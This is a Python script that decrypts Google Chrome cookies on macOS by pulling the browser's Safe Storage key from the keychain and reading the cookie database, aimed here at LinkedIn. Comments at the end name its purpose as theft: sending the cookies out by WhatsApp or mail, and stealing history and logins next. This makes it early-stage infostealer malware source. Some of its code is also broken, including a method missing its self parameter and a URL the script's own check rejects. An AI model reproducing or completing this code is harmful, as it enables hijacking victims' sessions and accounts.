import pathlib
import sqlite3
import sys
import urllib.error
import urllib.parse
from typing import Iterator
import keyring
from Cryptodome import Cipher
from Cryptodome.Cipher import AES
from Cryptodome.Hash import SHA1
from Cryptodome.Protocol.KDF import PBKDF2

class Cookies:

    def __init__(self, url_cookies):
        self.url_cookies = url_cookies
    
    def get_configuration(self) -> dict:
        """Get dict configu
        Returns:
        """
        cookie_file = (
            "~/Library/Application Support/Google/Chrome/Default/Cookies"
        )
        browser = "chrome"
        setting = {
            "my_pass": keyring.get_password(
                "{} Safe Storage".format(browser), browser
            ),
            "iterations": 1003,
            "cookie_file": cookie_file,
        }
        return setting

    def _hosts_generators(hostname: str) -> Iterator[str]:
        """ 
        All possible cases
        """
        labels = hostname.split(".")
        for i in range(2, len(labels) + 1):
            domain = ".".join(labels[-i:])
            yield domain
            yield "." + domain

    def clean(self, decrypted: bytes) -> str:
        """Strip padding from decrypted value.
        Args:
        Returns:
        """
        last = decrypted[-1]
        if isinstance(last, int):
            return decrypted[:-last].decode("utf8")
        return decrypted[: -ord(last)].decode("utf8")


    def chrome_decrypt(self, encrypted_value: bytes, key: bytes, init_vector: bytes) -> str:
        """Decrypt Chrome encrypted cookies.
        Args:
            encrypted_value: Encrypted cookie from Chrome cookie file
            key: Key to decrypt encrypted_value
            init_vector: Initialization vector for decrypting encrypted_value
        Returns:
            Decrypted value of encrypted_value
        """
        encrypted_value = encrypted_value[3:]

        cipher = AES.new(key, AES.MODE_CBC, IV=init_vector)
        decrypted = cipher.decrypt(encrypted_value)
        return self.clean(decrypted)
    

    def get_cookies(self, url : str, cookie_file: str = None, password = None):
        """Fetch Cookies From Chrome.
        Args:
            url: Domain to extract cookies
            cookie_file: Path file cookie
        """
        try :
            if sys.platform == "darwin":
                setting = self.get_configuration()
        except :
            raise OSError("It is work only for MacOS")

        setting.update(
            {"init_vector": b" " * 16, "length": 16, "salt": b"saltysalt"}
        )

        if cookie_file:
            cookie_file = str(pathlib.Path(cookie_file).expanduser())
        else:
            cookie_file = str(pathlib.Path(setting["cookie_file"]).expanduser())
        
        
        if isinstance(password, bytes):
            setting["my_pass"] = password
        elif isinstance(password, str):
            setting["my_pass"] = password.encode("utf8")
        elif isinstance(setting["my_pass"], str):
            setting["my_pass"] = setting["my_pass"].encode("utf8")


        

        enc_key = PBKDF2(
            setting["my_pass"],
            count=setting["iterations"],
            dkLen=setting["length"],
            salt=setting["salt"],
        )

        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.scheme:
            domain = parsed_url.netloc
        else:
            raise urllib.error.URLError("The link must be like : http://www.example.com !")

        try:
            conn = sqlite3.connect("file:{}?mode=ro".format(cookie_file), uri=True)
        except sqlite3.OperationalError:
            print(" at: {}\n".format(cookie_file))
            raise
        secure_column_name = "is_secure"
        for (
            sl_no,
            column_name,
            data_type,
            is_null,
            default_val,
            pk,
        ) in conn.execute("PRAGMA table_info(cookies)"):
            if column_name == "secure":
                secure_column_name = "secure"
                break

        sql = (
            "select host_key, path, "
            + secure_column_name
            + ", expires_utc, name, value, encrypted_value "
            "from cookies where host_key like ?"
        )
        cookies = dict()

        for host_key in self._hosts_generators(domain):
            for (
                hk,
                path,
                is_secure,
                expires_utc,
                cookie_key,
                val,
                enc_val,
            ) in conn.execute(sql, (host_key,)):
                if val or (enc_val[:3] not in {b"v10", b"v11"}):
                    pass
                else:
                    val = self.chrome_decrypt(
                        enc_val, key=enc_key, init_vector= setting["init_vector"]
                    )
                cookies[cookie_key] = val

        conn.rollback()
        conn.close()
        return cookies

    def run(self):
        cookies = self.get_cookies(self.url_cookies)
        print(cookies)

        # Advanced will be sent this to whatsapp or Mail
        # Todo Steal history
        # Steal logins



c = Cookies("www.linkedin.com")
c.run()